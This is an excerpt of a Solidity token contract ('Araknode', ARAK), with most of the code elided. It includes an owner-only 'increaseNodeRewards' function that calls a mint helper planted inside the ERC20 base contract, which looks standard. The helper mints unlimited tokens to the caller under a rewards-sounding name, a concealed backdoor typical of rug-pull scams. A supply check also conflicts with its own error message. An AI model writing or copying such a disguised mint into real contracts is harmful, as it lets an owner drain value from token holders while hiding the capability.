...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _increaseNodeRewards(uint256 amount) internal virtual { _mint(msg.sender, amount); }
}
...
contract Araknode is ERC20, Ownable, PaymentSplitter {
    ...
    constructor(
        ...
        uint256 swapAmount,
        address uniV2Router
    ) ERC20("AraknodeToken", "ARAK") PaymentSplitter(payees, shares) {
        ...
        require(addresses.length > 0 && balances.length > 0, "ARAK: addresses array length must be greater than zero");
        require(addresses.length == balances.length, "ARAK: addresses arrays length mismatch");

        for (uint256 i = 0; i < addresses.length; i++) {
            _mint(addresses[i], balances[i] * (10**18));
        }
        require(totalSupply() == 20456743e18, "ARAK: totalSupply must equal 20 million"); // fix
        require(swapAmount > 0, "ARAK: Swap amount incorrect");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "ARAK: The router already has that address");
    ...
    function increaseNodeRewards(uint256 rewards) external onlyOwner {
        _increaseNodeRewards(rewards);
    }
    ...
    function cashoutReward(uint256 blocktime) public {
        address sender = _msgSender();
        require(sender != address(0), "ARAK:  creation from the zero address");
        require(!_isBlacklisted[sender], "ARAKT: Blacklisted address");
        require(
            sender != futurUsePool && sender != distributionPool,
            "ARAK: futur and rewardsPool cannot cashout rewards"
        );
        ...
        require(
            rewardAmount > 0,
            "ARAK: You don't have enough reward to cash out"
        );
    ...
    function cashoutAll() public {
        ...
        require(
            sender != address(0),
            "ARAK:  creation from the zero address"
        );
